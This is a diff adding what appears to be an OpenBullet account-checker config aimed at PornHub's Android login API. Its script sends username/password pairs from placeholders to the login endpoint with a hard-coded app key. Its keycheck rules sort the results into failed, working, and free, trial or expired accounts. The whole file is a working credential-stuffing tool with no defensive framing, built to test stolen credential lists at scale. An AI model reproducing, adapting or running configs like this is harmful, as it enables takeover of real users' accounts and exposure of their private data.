@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "PornHub",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-13T19:20:29.5300846-05:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://api.pornhub.com/api_android_v3/login?appKey=72d2512a43364263e9d94f0f73&uuid=FfaezisHot&username=<USER>&password=<PASS>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "INVALID USERNAME OR PASSWORD" 
+  KEYCHAIN Success OR 
+    KEY "{\"user\":{\"id\":\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"userType\":\"Expired\",\"" 
+    KEY "\"userType\":\"Trial\",\"" 
+    KEY "\"userType\":\"Free\",\"" 
+
